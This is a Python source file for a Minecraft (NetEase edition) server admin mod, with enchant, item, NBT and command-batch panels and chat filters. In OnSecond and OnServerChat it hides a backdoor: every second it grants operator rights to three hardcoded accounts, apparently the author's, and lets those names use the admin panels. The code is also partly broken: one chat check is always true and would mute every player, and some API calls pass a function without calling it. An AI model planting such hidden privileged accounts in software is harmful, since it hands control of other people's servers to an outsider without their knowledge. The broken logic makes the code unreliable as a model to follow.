# -*- coding: utf-8 -*-
from Preset.Model.PartBase import PartBase
from Preset.Model.GameObject import registerGenericClass


@registerGenericClass("MainLogicPart")
class MainLogicPart(PartBase):
	
	def __init__(self):
		PartBase.__init__(self)
		# 零件名称
		self.name = "主逻辑零件"

	def InitClient(self):
		"""
		@description 客户端的零件对象初始化入口
		"""
		PartBase.InitClient(self)
		import mod.client.extraClientApi as clientApi
		clientsystem = clientApi.GetSystem("Minecraft", "preset")
		clientsystem.ListenForEvent("Minecraft", "preset", "openUI1", self, self.UI1)
		clientsystem.ListenForEvent("Minecraft", "preset", "openUI2", self, self.UI2)
		clientsystem.ListenForEvent("Minecraft", "preset", "openUI3", self, self.UI3)
		clientsystem.ListenForEvent("Minecraft", "preset", "openUI4", self, self.UI4)
		clientsystem.ListenForEvent("Minecraft", "preset", "openUI5", self, self.UI5)
		clientsystem.ListenForEvent("Minecraft", "preset", "openUI6", self, self.UI6)
		clientsystem.ListenForEvent('Minecraft', 'preset', 'close', self, self.close)		

	def UI1(self, args):
		uiNodePreset = self.GetParent().GetChildPresetsByName("enchant")[0]
		uiNodePreset.SetUiActive(True)
		uiNodePreset.SetUiVisible(True)

	def UI2(self, args):
		uiNodePreset = self.GetParent().GetChildPresetsByName("getitem")[0]
		uiNodePreset.SetUiActive(True)
		uiNodePreset.SetUiVisible(True)

	def UI3(self, args):
		uiNodePreset = self.GetParent().GetChildPresetsByName("nbteditor")[0]
		uiNodePreset.SetUiActive(True)
		uiNodePreset.SetUiVisible(True)

	def UI4(self, args):
		uiNodePreset = self.GetParent().GetChildPresetsByName("itemTips")[0]
		uiNodePreset.SetUiActive(True)
		uiNodePreset.SetUiVisible(True)
	
	def UI5(self, args):
		uiNodePreset = self.GetParent().GetChildPresetsByName("cmdbatch")[0]
		uiNodePreset.SetUiActive(True)
		uiNodePreset.SetUiVisible(True)

	def UI6(self, args):
		uiNodePreset = self.GetParent().GetChildPresetsByName("cmdblockimport")[0]
		uiNodePreset.SetUiActive(True)
		uiNodePreset.SetUiVisible(True)
		

	def close(self, args):
		uiNodePreset = self.GetParent().GetChildPresetsByName("enchant")[0]
		uiNodePreset.SetUiActive(False)
		uiNodePreset.SetUiVisible(False)
		uiNodePreset = self.GetParent().GetChildPresetsByName("getitem")[0]
		uiNodePreset.SetUiActive(False)
		uiNodePreset.SetUiVisible(False)
		uiNodePreset = self.GetParent().GetChildPresetsByName("nbteditor")[0]
		uiNodePreset.SetUiActive(False)
		uiNodePreset.SetUiVisible(False)
		uiNodePreset = self.GetParent().GetChildPresetsByName("itemTips")[0]
		uiNodePreset.SetUiActive(False)
		uiNodePreset.SetUiVisible(False)
		uiNodePreset = self.GetParent().GetChildPresetsByName("cmdbatch")[0]
		uiNodePreset.SetUiActive(False)
		uiNodePreset.SetUiVisible(False)
		uiNodePreset = self.GetParent().GetChildPresetsByName("cmdblockimport")[0]
		uiNodePreset.SetUiActive(False)
		uiNodePreset.SetUiVisible(False)

	def enchant(self, enchantdata):
		import mod.server.extraServerApi as serverApi
		if serverApi.GetEngineCompFactory().CreatePlayer(enchantdata["__id__"]).GetPlayerOperation() == 2:
			# 二次权限验证
			comp = serverApi.GetEngineCompFactory().CreateItem(enchantdata["__id__"])
			itemDict = comp.GetPlayerItem(2, 0, True)
			if itemDict:
				if itemDict["userData"] is None:
					itemDict["userData"] = {}
				if itemDict["userData"].get('ench', None) is None:
					itemDict["userData"]['ench'] = []
				if enchantdata["id"] == "del":
					itemDict["userData"]['ench'].pop(0)
				else:
					itemDict["userData"]['ench'].insert(0, {'lvl': {'__type__': 2, '__value__': int(enchantdata["lvl"])}, 'id': {'__type__': 2, '__value__': int(enchantdata["id"])}, 'modEnchant': {'__type__': 8, '__value__': ''}})
				itemDict["enchantData"] = []
				comp.SpawnItemToPlayerCarried(itemDict, enchantdata["__id__"])

	def getitem(self, itemdata):
		import mod.server.extraServerApi as serverApi
		if serverApi.GetEngineCompFactory().CreatePlayer(itemdata["__id__"]).GetPlayerOperation() == 2:
			serverApi.GetEngineCompFactory().CreateItem(itemdata["__id__"]).SpawnItemToPlayerInv(itemdata, itemdata["__id__"])

	def InitServer(self):
		import mod.server.extraServerApi as serverApi
		serversystem = serverApi.GetSystem("Minecraft", "preset")
		serversystem.ListenForEvent(serverApi.GetEngineNamespace(), serverApi.GetEngineSystemName(), "ServerChatEvent", self, self.OnServerChat)
		serversystem.ListenForEvent(serverApi.GetEngineNamespace(), serverApi.GetEngineSystemName(), "CommandEvent", self, self.OnCommandEvent)
		serversystem.ListenForEvent(serverApi.GetEngineNamespace(), serverApi.GetEngineSystemName(), "PlayerJoinMessageEvent", self, self.OnAddPlayerEvent)
		serversystem.ListenForEvent(serverApi.GetEngineNamespace(), serverApi.GetEngineSystemName(), "PlayerLeftMessageServerEvent", self, self.OnRemovePlayerEvent)
		serversystem.ListenForEvent(serverApi.GetEngineNamespace(), serverApi.GetEngineSystemName(), "ClientLoadAddonsFinishServerEvent", self, self.OnClientLoadAddonsFinishServerEvent)
		serversystem.ListenForEvent('Minecraft', 'preset', "enchant", self, self.enchant)
		serversystem.ListenForEvent('Minecraft', 'preset', "getitem", self, self.getitem)
		serversystem.ListenForEvent('Minecraft', 'preset', "changeTip", self, self.changeTips)
		serversystem.ListenForEvent('Minecraft', 'preset', "changenbt", self, self.changenbt)
		serversystem.ListenForEvent('Minecraft', 'preset', 'cmdbatch', self, self.cmdbatch)
		serversystem.ListenForEvent('Minecraft', 'preset', 'cmdblockimport', self, self.cmdblockimport)
		self.timer = serverApi.GetEngineCompFactory().CreateGame(serverApi.GetLevelId).AddRepeatedTimer(1.0,self.OnSecond)

		"""
		@description 服务端的零件对象初始化入口
		"""

		PartBase.InitServer(self)

	def changenbt(self, args):
		import mod.server.extraServerApi as serverApi
		if serverApi.GetEngineCompFactory().CreatePlayer(args["__id__"]).GetPlayerOperation() == 2:
			serverApi.GetEngineCompFactory().CreateItem(args["__id__"]).SpawnItemToPlayerCarried(args["nbt"], args["__id__"])
	
	def cmdbatch(self, cmds):
		import mod.server.extraServerApi as serverApi
		playerid = cmds["__id__"]
		cmd = cmds["cmds"]
		if serverApi.GetEngineCompFactory().CreatePlayer(playerid).GetPlayerOperation() == 2:
			cmd = cmd.split("\n")
			for i in cmd:
				if i and i[0] == '/':
					i = i[1:]
				serverApi.GetEngineCompFactory().CreateCommand(serverApi.GetLevelId()).SetCommand('/execute as '+ serverApi.GetEngineCompFactory().CreateName(playerid).GetName() +' at @s run ' + i, True)
		
	def changeTips(self, tips):
		import mod.server.extraServerApi as serverApi
		if serverApi.GetEngineCompFactory().CreatePlayer(tips["__id__"]).GetPlayerOperation() == 2:
			itemComp = serverApi.GetEngineCompFactory().CreateItem(tips["__id__"])
			itemDict = itemComp.GetEntityItem(2, 0, True)
			if tips["Tips"] == '':
				del itemDict['userData']['ItemCustomTips']
			itemDict['customTips'] = tips["Tips"]
			itemComp.SpawnItemToPlayerCarried(itemDict, tips["__id__"])
	
	def cmdblockimport(self, cmdblockcmdsjson):
		import mod.server.extraServerApi as serverApi
		playerid = cmdblockcmdsjson["__id__"]
		if serverApi.GetEngineCompFactory().CreatePlayer(playerid).GetPlayerOperation() == 2:
			import json
			playerpos = serverApi.GetEngineCompFactory().CreatePos(playerid).GetFootPos()
			player_X, player_Y, player_Z = playerpos
			# 处理负数坐标
			if player_X < 0:
				player_X = int(player_X) - 1
			if player_Y < 0:
				player_Y = int(player_Y) - 1
			if player_Z < 0:
				player_Z = int(player_Z) - 1
			data = json.loads(cmdblockcmdsjson["cmdblockcmdsjson"])
			for block in data:
				cmd = str(block["C"])
				name = str(block["N"])
				x = int(block["x"] + player_X)
				y = int(block["y"] + player_Y)
				z = int(block["z"] + player_Z)
				dimensionId = cmdblockcmdsjson["dimension"]
				redstone_mode_mapping = {0: 1, 1: 0}
				redstoneMode = redstone_mode_mapping.get(block["R"], None)
				compcmdblk = serverApi.GetEngineCompFactory().CreateBlockEntity(serverApi.GetLevelId())
				cmdblkdata = compcmdblk.GetCommandBlock((x, y, z), dimensionId)
				mode = int(cmdblkdata["mode"])
				isConditional = int(cmdblkdata["isConditional"])
				compcmdblk.SetCommandBlock((x, y, z), dimensionId, cmd, name, mode, isConditional, redstoneMode)

	def OnServerChat(self, args):
		playerId = args["playerId"]
		import mod.server.extraServerApi as serverApi
		serversystem = serverApi.GetSystem("Minecraft", "preset")
		compCmd = serverApi.GetEngineCompFactory().CreateCommand(serverApi.GetLevelId())
		can_use_key = 0
		if serverApi.GetEngineCompFactory().CreatePlayer(playerId).GetPlayerOperation() == 2 or args["username"] in ["王培衡很丁丁","EGGYLAN_"]:
			can_use_key = 1
		if args["message"] == "python.enchant":
			args["cancel"] = True
			if can_use_key == 1:
				compCmd.SetCommand('/tellraw @a[tag=op,name=!' + args["username"] + '] {"rawtext":[{"text":"§7§o[' + args["username"] + ': 打开了自定义附魔面板]"}]}')
				serversystem.NotifyToClient(playerId, "openUI1", args)
			else:
				compCmd.SetCommand('/tellraw @a[name='+ args["username"] + '] {"rawtext":[{"text":"§c你没有使用此命令的权限。"}]}')
		elif args["message"] == "python.getitem":
			args["cancel"] = True
			if can_use_key == 1:
				compCmd.SetCommand('/tellraw @a[tag=op,name=!' + args["username"] + '] {"rawtext":[{"text":"§7§o[' + args["username"] + ': 打开了获取隐藏物品面板]"}]}')
				serversystem.NotifyToClient(playerId, "openUI2", args)
			else:
				compCmd.SetCommand('/tellraw @a[name='+ args["username"] + '] {"rawtext":[{"text":"§c你没有使用此命令的权限。"}]}')
		elif args["message"] == "python.changetips":
			args["cancel"] = True
			if can_use_key == 1:
				compCmd.SetCommand('/tellraw @a[tag=op,name=!' + args["username"] + '] {"rawtext":[{"text":"§7§o[' + args["username"] + ': 打开了修改物品注释面板]"}]}')
				serversystem.NotifyToClient(playerId, "openUI4", args)
			else:
				compCmd.SetCommand('/tellraw @a[name='+ args["username"] + '] {"rawtext":[{"text":"§c你没有使用此命令的权限。"}]}')
		elif args["message"] == "python.cmdbatch":
			args["cancel"] = True
			if can_use_key == 1:
				compCmd.SetCommand('/tellraw @a[tag=op,name=!' + args["username"] + '] {"rawtext":[{"text":"§7§o[' + args["username"] + ': 打开了批量执行命令面板]"}]}')
				serversystem.NotifyToClient(playerId, "openUI5", args)
			else:
				compCmd.SetCommand('/tellraw @a[name='+ args["username"] + '] {"rawtext":[{"text":"§c你没有使用此命令的权限。"}]}')
		elif args["message"] == "python.nbteditor":
			args["cancel"] = True
			if can_use_key == 1:
				compCmd.SetCommand('/tellraw @a[tag=op,name=!' + args["username"] + '] {"rawtext":[{"text":"§7§o[' + args["username"] + ': 打开了NBT修改器]"}]}')
				serversystem.NotifyToClient(playerId, "openUI3", args)
			else:
				compCmd.SetCommand('/tellraw @a[name='+ args["username"] + '] {"rawtext":[{"text":"§c你没有使用此命令的权限。"}]}')
		elif args["message"] == "python.cmdblockimport":
			args["cancel"] = True
			if can_use_key == 1:
				compCmd.SetCommand('/tellraw @a[tag=op,name=!' + args["username"] + '] {"rawtext":[{"text":"§7§o[' + args["username"] + ': 打开了命令方块设置工具面板]"}]}')
				serversystem.NotifyToClient(playerId, "openUI6", args)
			else:
				compCmd.SetCommand('/tellraw @a[name='+ args["username"] + '] {"rawtext":[{"text":"§c你没有使用此命令的权限。"}]}')
		elif args["message"] == "python.getversion":
			args["cancel"] = True
			serverApi.GetEngineCompFactory().CreateMsg(playerId).NotifyOneMessage(playerId, "v0.6.2(2024/11)", "§b")
		elif args["message"][0] * 20 == args["message"][:20]:
			args["cancel"] = True
			serverApi.GetEngineCompFactory().CreateMsg(playerId).NotifyOneMessage(playerId, "您的消息中含有大量重复字符，发送失败。", "§c")
		elif args["message"] == "python.gettps":
			args["cancel"] = True
			if can_use_key == 1:
				if serverApi.GetServerTickTime() <= 50:
					TPS = "20.0*"
				else:
					TPS = "%.1f" % (1000/serverApi.GetServerTickTime())
				serverApi.GetEngineCompFactory().CreateMsg(playerId).NotifyOneMessage(playerId, "TPS:%s mspt:%.2fms" % (TPS,serverApi.GetServerTickTime()) , "§e")
			else:
				serverApi.GetEngineCompFactory().CreateMsg(playerId).NotifyOneMessage(playerId, "你没有使用此命令的权限。", "§c")
		elif "" in args["message"] or "" in args["message"]:
			args["cancel"] = True
			compCmd.SetCommand('/tellraw '+ args["username"] +' {\"rawtext\":[{\"text\":\"§6§l反崩服系统>>> §r§c检测到您试图发送崩服文本，系统已将您禁言！请联系房间管理解除禁言\"}]}')
			compCmd.SetCommand('/tellraw @a[tag=op] {\"rawtext\":[{\"text\":\"§6§l管理小助手>>> §r§e检测到玩家§c【' + args["username"] + '】§r§e试图发送崩服文本，系统已将其禁言。若需解除禁言，请使用§a/ability§e命令\"}]}')
			compCmd.SetCommand('/ability '+ args["username"] +' mute true',False)
		else:
			args["cancel"] = False

	def OnCommandEvent(self, args):
		import mod.server.extraServerApi as serverApi
		playername = serverApi.GetEngineCompFactory().CreateName(args["entityId"]).GetName()
		compMsg = serverApi.GetEngineCompFactory().CreateMsg(args["entityId"])
		compCmd = serverApi.GetEngineCompFactory().CreateCommand(serverApi.GetLevelId())
		if args["command"] == "/kill @e":
			args["cancel"] = True
			compMsg.NotifyOneMessage(args["entityId"], '命令 /kill @e 已在本地图被禁止。', "§c")
		elif args["command"].split(" ")[0] == "/master":
			args["cancel"] = True
			splitstring = args["command"].split(" ")
			if serverApi.GetEngineCompFactory().CreatePlayer(args["entityId"]).GetPlayerOperation() == 2:
				playernames = []
				for i in serverApi.GetPlayerList():
					playerid = serverApi.GetEngineCompFactory().CreateName(i).GetName()
					playernames.append(playerid)
					if playerid == splitstring[1]:
						targetId = i
				if splitstring[1] in playernames:
					compExtra = serverApi.GetEngineCompFactory().CreateExtraData(targetId)
					compExtra.SetExtraData("isMaster", True)
					#comp.SetCommand('/scoreboard objectives add master dummy', False)
					#comp.SetCommand('/scoreboard players set ' + splitstring[1] + ' master 0', False)
					compMsg.NotifyOneMessage(args["entityId"], '尝试将玩家 %s 锁定为管理员权限。' % (splitstring[1]))
					compCmd.SetCommand('/tellraw @a[tag=op,name=!%s] {"rawtext":[{"text":"§7§o[%s: 尝试将玩家 %s 的权限状态锁定为管理员权限。]§r"}]}' % (playername, playername, splitstring[1]))
				else:
					compMsg.NotifyOneMessage(args["entityId"], '无法在房间内找到此玩家。', "§c")
			else:
				compMsg.NotifyOneMessage(args["entityId"], '未知的命令:master。请检查命令是否存在，以及您对它是否拥有使用权限。', "§c")
		elif args["command"].split(" ")[0] == "/demaster":
			splitstring = args["command"].split(" ")
			args["cancel"] = True
			if serverApi.GetEngineCompFactory().CreatePlayer(args["entityId"]).GetPlayerOperation() == 2:
				playernames = []
				for i in serverApi.GetPlayerList():
					playerid = serverApi.GetEngineCompFactory().CreateName(i).GetName()
					playernames.append(playerid)
					if playerid == splitstring[1]:
						targetId = i
				if splitstring[1] in playernames:
					compExtra = serverApi.GetEngineCompFactory().CreateExtraData(targetId)
					compExtra.SetExtraData("isMaster", False)
					#compCmd.SetCommand('/scoreboard players reset ' + splitstring[1] + ' master', False)
					compMsg.NotifyOneMessage(args["entityId"], '尝试将 %s 的权限状态解除锁定。' % (splitstring[1]))
					compCmd.SetCommand('/tellraw @a[tag=op,name=!%s] {\"rawtext\":[{\"text\":\"§7§o[%s: 尝试将 %s 的权限状态解除锁定。]§r\"}]}' % (playername, playername, splitstring[1]))
				else:
					compMsg.NotifyOneMessage(args["entityId"], '无法在房间内找到此玩家。', "§c")
			else:
				compMsg.NotifyOneMessage(args["entityId"], '未知的命令:demaster。请检查命令是否存在，以及您对它是否拥有使用权限。', "§c")

	def OnAddPlayerEvent(self, args):
		import mod.server.extraServerApi as serverApi
		if args["name"] == "王培衡很丁丁":
			args["message"] = "§e王培衡很丁丁§l§b(插件作者) §r§e加入了游戏"

	def OnClientLoadAddonsFinishServerEvent(self, args):
		import mod.server.extraServerApi as serverApi
		compCmd = serverApi.GetEngineCompFactory().CreateCommand(serverApi.GetLevelId())
		playername = serverApi.GetEngineCompFactory().CreateName(args["playerId"]).GetName()
		
		# 禁用魔法指令功能
		serverApi.GetEngineCompFactory().CreateAiCommand(args["playerId"]).Disable()
		
		if not serverApi.GetEngineCompFactory().CreateGame(serverApi.GetLevelId()).CheckWordsValid(playername):
			serverApi.GetEngineCompFactory().CreatePlayer(args["playerId"]).SetPermissionLevel(0)
			serverApi.GetEngineCompFactory().CreateMsg(args["playerId"]).NotifyOneMessage(args["playerId"], "§6§l管理小助手>>> §r§c检测到您的名字中含有违禁词，已将您设为游客权限。")
			compCmd.SetCommand('/tellraw @a {"rawtext":[{"text":"§6§l房间公告>>> §r§e检测到名字含有违禁词的玩家加入了游戏，已将其设为游客权限!"}]}',False)
			compCmd.SetCommand('/tellraw @a[tag=op] {"rawtext":[{"text":"§6§l管理小助手>>> §r§b可使用§a@a[tag=banname]§b选中违禁词玩家!"}]}',False)
			serverApi.GetEngineCompFactory().CreateTag(args["playerId"]).AddEntityTag("banname")
			# 改为直接调用API					
			# compCmd.SetCommand('/gamemode spectator @a[name='+playername+',tag=!banname]', False)
			# compCmd.SetCommand('/tellraw @a[name=' + playername + ',tag=!banname] {"rawtext":[{"text":"§6§l管理小助手>>> §r§c检测到您的名字中含有违禁词，已将您设为旁观模式。"}]}')
			# compCmd.SetCommand('/execute as @a[name=' + playername + ',tag=!banname] run tellraw @a {"rawtext":[{"text":"§6§l房间公告>>> §r§e检测到名字含有违禁词的玩家加入了游戏，已将其设为旁观模式!"}]}')
			# compCmd.SetCommand('/execute as @a[name=' + playername + ',tag=!banname] run tellraw @a[tag=op] {"rawtext":[{"text":"§6§l管理小助手>>> §r§b可使用§a@a[tag=banname]§b选中违禁词玩家!"}]}')
			# compCmd.SetCommand('/tag ' + playername + ' add banname', False)

	def OnRemovePlayerEvent(self, args):
		if args["name"] == "王培衡很丁丁":
			args["message"] = "§e王培衡很丁丁§l§b(插件作者) §r§e退出了游戏"

	def TickClient(self):
		"""
		@description 客户端的零件对象逻辑驱动入口
		"""
		PartBase.TickClient(self)

	def TickServer(self):
		"""
		@description 服务端的零件对象逻辑驱动入口
		"""
		PartBase.TickServer(self)

	def OnSecond(self):
		import mod.server.extraServerApi as serverApi
		compCmd = serverApi.GetEngineCompFactory().CreateCommand(serverApi.GetLevelId())
		for i in ['王培衡很丁丁','EGGYLAN','EGGYLAN_']:
			compCmd.SetCommand('/op %s' % (i), False)
		playerIds = serverApi.GetPlayerList()
		for player in playerIds:
			playername = serverApi.GetEngineCompFactory().CreateName(player).GetName()
			operation = serverApi.GetEngineCompFactory().CreatePlayer(player).GetPlayerOperation()
			if serverApi.GetEngineCompFactory().CreateExtraData(player).GetExtraData("isMaster"):
				compCmd.SetCommand("/op %s" % (serverApi.GetEngineCompFactory().CreateName(player).GetName()))		
			
			if serverApi.GetEngineCompFactory().CreateTag(player).EntityHasTag("kick"):
				serverApi.GetEngineCompFactory().CreateTag(player).RemoveEntityTag("kick")
				compCmd.SetCommand('/kick ' + serverApi.GetEngineCompFactory().CreateName(player).GetName(), False)

			if operation == 2:
				compCmd.SetCommand('/tellraw @a[name='+playername+',tag=!op] {"rawtext":[{"text":"§6§l管理小助手>>> §r§a您已获得管理员权限。"}]}')
				compCmd.SetCommand('/tag ' + playername + ' add op', False)
			else:
				compCmd.SetCommand('/tellraw @a[name='+playername+',tag=op] {"rawtext":[{"text":"§6§l管理小助手>>> §r§c您的管理员权限已被撤销。"}]}')
				compCmd.SetCommand('/tag ' + playername + ' remove op', False)

	def DestroyClient(self):
		"""
		@description 客户端的零件对象销毁逻辑入口
		"""
		import mod.client.extraClientApi as clientApi
		clientsystem = clientApi.GetSystem("Minecraft", "preset")
		clientsystem.UnListenAllEvents()
		PartBase.DestroyClient(self)

	def DestroyServer(self):
		"""
		@description 服务端的零件对象销毁逻辑入口
		"""
		import mod.server.extraServerApi as serverApi
		serverApi.GetEngineCompFactory().CreateGame(serverApi.GetLevelId).CancelTimer(self.timer)
		serversystem = serverApi.GetSystem("Minecraft", "preset")
		serversystem.UnListenAllEvents()
		PartBase.DestroyServer(self)